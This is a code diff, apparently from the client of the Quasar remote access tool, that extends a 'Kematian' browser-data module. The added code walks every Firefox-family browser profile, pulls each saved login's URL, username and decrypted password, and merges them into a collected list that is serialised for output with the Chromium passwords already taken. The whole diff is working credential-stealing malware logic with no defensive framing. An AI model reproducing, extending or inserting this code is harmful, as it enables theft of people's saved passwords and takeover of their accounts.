@@ -7,6 +7,7 @@ using Quasar.Client.Kematian.Browsers.Chromium.History;
 using Quasar.Client.Kematian.Browsers.Chromium.Cookies;
 using Quasar.Client.Kematian.Browsers.Chromium.Downloads;
 using Quasar.Client.Kematian.Browsers.Gecko.History;
+using Quasar.Client.Kematian.Browsers.Gecko.Passwords;
 using Quasar.Client.Kematian.Browsers.Helpers.Structs;
 using Quasar.Client.Kematian.Browsers.Helpers;
 using Quasar.Client.Kematian.Browsers.Chromium.Passwords;
@@ -218,6 +219,29 @@ namespace Quasar.Client.Kematian.Browsers
                         }
                     }
                 }
+
+                var geckoLogins = new PasswordsGecko();
+
+                foreach (var browser in _geckoBrowsers)
+                {
+                    foreach (var profile in browser.Profiles)
+                    {
+                        var passwords = geckoLogins.GetLogins(profile.Path, profile.LoginsJson);
+                        foreach (var entry in passwords)
+                        {
+                            var newEntry = new Dictionary<string, string>
+                            {
+                                {"Url", entry.Url},
+                                {"Username", entry.Username},
+                                {"Password", entry.Password}
+                            };
+                            allPasswords.Add(newEntry);
+                        }
+                    }
+                }
+
+                geckoLogins.Dispose();
+
                 return allPasswords.Count > 1000
                     ? Serializer.SerializeDataInBatches(allPasswords, 1000)
                     : Serializer.SerializeData(allPasswords);
